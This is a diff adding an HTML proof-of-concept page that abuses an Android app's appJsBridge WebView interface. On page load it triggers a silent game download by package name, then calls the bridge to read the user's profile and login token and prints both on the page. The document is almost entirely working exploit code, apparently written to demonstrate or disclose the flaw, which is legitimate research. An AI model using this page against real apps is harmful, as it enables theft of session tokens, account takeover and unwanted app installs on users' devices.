@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Plain JS POC Page</title>
+        <style>
+            #logs-list {
+                list-style: none;
+                margin: 0;
+                padding: 0;
+            }
+            li {
+                word-wrap: break-word;
+            }
+        </style>
+    </head>
+    <body>
+        <h2>Dispatched Logs:</h2>
+        <div id="log-list-container">
+            <ul id="logs-list"></ul>
+        </div>
+
+        <script>
+            function downloadApp(pkg) {
+                window.location.href = `appJsBridge://android.downloadGameByPackageName?data=%7B%22id%22:%22-1%22,%22packageName%22:%22${pkg}%22,%22extraMap%22:null%7D&callback=appDownload`;
+            }
+
+            function fetchToken() {
+                window.location.href = `appJsBridge://android.getLoginInfo?data=null&callback=token`;
+            }
+
+            function fetchDetail() {
+                window.location.href = `appJsBridge://commonObj.getUserInfo?data=null&callback=detail`;
+            }
+
+            class AppJsBridge {
+		<! webview return msg, then call dispatchResult(), >
+                dispatchResult(str, obj, bol) {
+                    const result = JSON.parse(obj)
+                    console.log(
+                        `{ Name- ${str} - Obj - ${JSON.stringify(obj)} }`
+                    );
+
+                    if (str === "appDownload") {
+                        fetchDetail();
+                    } else if (str === "detail") {
+                        const logsList = document.getElementById("logs-list");
+
+                        const listItem = document.createElement("li");
+                        listItem.innerHTML = `<pre>${JSON.stringify(obj, undefined, 2)}</pre>`;
+
+                        logsList.appendChild(listItem);
+                        fetchToken()
+                    } else {
+                        const logsList = document.getElementById("logs-list");
+
+                        const listItem = document.createElement("li");
+                        listItem.innerHTML = `<b>Token</b><br/><br/>${result["data"]}`;
+
+                        logsList.appendChild(listItem);
+                    }
+                }
+            }
+
+            window.appJsBridge = new AppJsBridge();
+            downloadApp("com.FatcatStudio.TargetHavoc"); <! send msg to webview>
+        </script>
+    </body>
+</html>
